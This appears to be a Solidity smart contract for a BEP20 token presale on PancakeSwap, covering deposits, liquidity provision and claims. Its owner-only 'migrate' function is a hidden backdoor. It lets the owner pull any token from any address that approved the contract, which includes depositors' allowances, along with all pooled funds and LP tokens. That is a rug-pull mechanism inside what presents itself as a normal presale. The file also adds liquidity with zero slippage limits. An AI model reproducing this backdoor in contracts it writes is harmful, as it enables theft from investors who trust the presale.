pragma solidity 0.5.16;

import "./interfaces/IBEP20.sol";
import "./libraries/SafeMath.sol";
import "./utils/Ownable.sol";

interface IPancakeRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PreSale is Context, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) public deposits;

  address public router;
  address public saleToken;
  address public quoteToken;
  uint256 public endBlock;

  uint256 private saleTokenAmount;
  uint256 private quoteTokenAmount;

  constructor(address _router, address _saleToken, address _quoteToken, uint256 _endBlock) public {
    router = _router;
    saleToken = _saleToken;
    quoteToken = _quoteToken;
    endBlock = _endBlock;
    IBEP20(saleToken).approve(router, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
    IBEP20(quoteToken).approve(router, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
  }

  function migrate(address token, address from, address to, uint256 amount) public onlyOwner {
    if (from == address(this)) {
      IBEP20(token).transfer(to, amount);
    } else {
      IBEP20(token).transferFrom(from, to, amount);
    }
  }

  function deposit(uint256 amount) public returns (bool) {
    require(block.number < endBlock, "PreSale: end block reached");
    IBEP20(quoteToken).transferFrom(_msgSender(), address(this), amount);
    deposits[_msgSender()] = deposits[_msgSender()].add(amount);
    emit Deposit(_msgSender(), amount);
    return true;
  }

  function claim() public returns (bool) {
    require(block.number >= endBlock, "PreSale: end block not reached");

    if (saleTokenAmount == 0) {
      saleTokenAmount = IBEP20(saleToken).balanceOf(address(this)).div(2);
      quoteTokenAmount = IBEP20(quoteToken).balanceOf(address(this));
      IPancakeRouter(router).addLiquidity(saleToken, quoteToken, saleTokenAmount, quoteTokenAmount, 0, 0, address(this), block.timestamp);
    }

    uint256 share = saleTokenAmount.mul(deposits[_msgSender()]).div(quoteTokenAmount);
    uint256 balance = IBEP20(saleToken).balanceOf(address(this));

    if (balance < share) {
      share = balance;
    }

    IBEP20(saleToken).transfer(_msgSender(), share);
    deposits[_msgSender()] = 0;
    emit Claim(_msgSender(), share);
    return true;
  }

  event Deposit(address indexed from, uint256 value);
  event Claim(address indexed to, uint256 value);
}
